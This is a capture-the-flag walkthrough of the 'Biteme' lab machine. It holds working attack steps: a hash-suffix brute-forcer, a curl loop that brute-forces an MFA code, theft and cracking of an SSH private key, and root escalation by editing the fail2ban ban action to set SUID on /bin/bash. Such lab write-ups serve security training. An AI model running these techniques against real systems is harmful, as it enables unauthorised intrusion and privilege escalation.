#Biteme
>Siam Ahmed | 18.03.22
----------------------------------

```
export ip=10.10.211.222
```
Now let's create a nmap directory and start our first scan with nmap. 
```
nmap -sC -sV -oN nmap/initial $ip
```
we found 2 open ports one is ssh and one is a web server. 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
let's tinker them a little bit.
There is just a default page on ubuntu installation. There is not too much to tinker. We are goin to use
feroxbuster tool to do a directory brute forcing. install the feroxbuster and run the command
```
feroxbuster --url http://10.10.211.222/ |tee feroxbuster.log
```
We found a console url let's visit that.
Oh there is a login form. Let's try some default credentials.
```
admin
password
root
toor
```
that does not work. Now if we look at the source code we found a javascript founction.
```
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }
```
this is a obfuscated code. if we use a javascript deobfuscator we can read the function properly
```
function handleSubmit() {
    document.getElementById('clicked').value = 'yes';
    console.log('@fred I turned on php file syntax highlighting for you to review... jason');
    return true;
}
```
Hmm.. the php syntaxt highlighting is enabled so we can look for phps files. you can see we are accesing index.php . now insted of index.php access the index.phps. Here we go we found the php code. Now we can look for the different functions and files used in the backend.,

Now we found some interesting php code on index.phps 
```
<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>
```
here it's redirecting to ```mfa.php``` page let's try if we can access it. No it maybe need the cookies
now we can visit ```functions.phps``` and here we see a new file reference ```config.php``` we can visit that using the ```s``` at the end. Here we found the ```Login_user``` and it's in the hex.

we can decode it in bash quite easily by 
```
echo 6a61736f6e5f746573745f6163636f756e74 | xxd -r -p
```
it will return the string.
now we see a new line in the functions.php where we understand that password is md5 hash.
There is a new function in php file
```
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
}
```
where it is checking if the md5 hash of the password is 001. let's try php substr function on our own.

```
 php -a
Interactive mode enabled

php > $var ="pure test";
php > echo $var;
pure test
php > echo substr($var,-3);
est
php > 
```
so it will simply return the last three character of the string.So we could probably fake that.

so What we are going to do we are going to create a python script and I took this script from ```John Hammond```

Here is goes
```
#!/usr/bin/env python3

from hashlib import md5
import itertools
from string import ascii_lowercase

couinter = 1
while True:

	combinations =itertools.combinations_with_replacement(ascii_lowercase,r= couinter)
	for combo in combinations:
		
		string = "".join(combo)
		m = md5(string.encode("utf-8"))
		the_hash = m.hexdigest()
		if the_hash.endswith('001'):
			print(string,the_hash)
			exit()
	couinter += 1
```
This small script found the string . where you can see the string is abkr and the hash ends with 001. 
Now let's try to login with the credentials

okay!! it works. But we now need to pass the code.We are going to use bash to brute force it.
let's use curl to post the request
```
curl -X POST  10.10.175.36/console/mfa.php
curl -v 10.10.175.36/console/mfa.php --cookie "user={the_user_name}; pwd={the_password_you_have_found}"
curl -X POST --data "code=0000" 10.10.175.36/console/mfa.php --cookie "user={the_user_name}; pwd={the_password_you_have_found}"
```
now it gives us the response of incorrect password. Now we can loop through that data and find that actual code.

```
#!/usr/bin/bash

for i in {0000..9999};do echo $i; curl -s -X POST --data "code=$i" 10.10.175.36/console/mfa.php --cookie "user=jason_test_account; pwd=abkr" | wc | grep -v "23      95    1523"; if [ $? -eq 0 ]; then echo FOUND IT; break; fi; done
```
here is the bash script from ```John Hammond```. Now it would take some time. let's wait and see what output it gives us.

Now it got the redirect on ```2671``` in my case, it would be different on your case.
SO we found it.Now we are in file browser and file viewer
Let's go to ```/home/jason``` directory. Here we found user.txt and .ssh directory.
now if we view the /home/jason/user.txt we would get the user flag

now if we try to get the .ssh public key we can try
```
/home/jason/.ssh/id_rsa.pub
```
and gives us the results of the private key

now let's try to get the private key
```
/home/jason/.ssh/id_rsa
```

and yeah. It gives us the private key. 
save that into a new file and now make that only readable by us
```
chmod 600 jason_id_rsa
```
now use ssh2john for using the private key in john the ripper

```
/usr/share/john/ssh2john.py jason_id_rsa > forjohn.txt
```
now let's crack the password.
```
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
use that password to login with ssh

```
ssh -i jason_id_rsa jason@10.10.175.36
```

if we type ```sudo -l``` we can view what can we do with this
```
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```
and the interesting part is we can do anything with fred without a password
we can change our user to fred in bash

```
sudo -u fred bash
```

fred can do fail2ban which we can use to do prev esc.
```
systemctl status fail2ban
[active]
cd /etc/fail2ban/
ls -la
cd action.d/
ls -la
nano iptables-multiport.conf
```
now change some commands
```
actionban = chmod +s /bin/bash

actionunban = chmod +s /bin/bash
```
now let's restart the binary
```
sudo /bin/systemctl restart fail2ban
```
now let's watch the bin/bash

```
watch -n 0 ls -la /bin/bash
```
create a new terminal and we are going to ban ourselves
```
sshpass -p anything ssh lithex@10.10.175.36
```
if we run this our /bin/bash will change and if we run ```bash -p``` and we'll be root.

and now we can go to /root directory and here is the root.txt

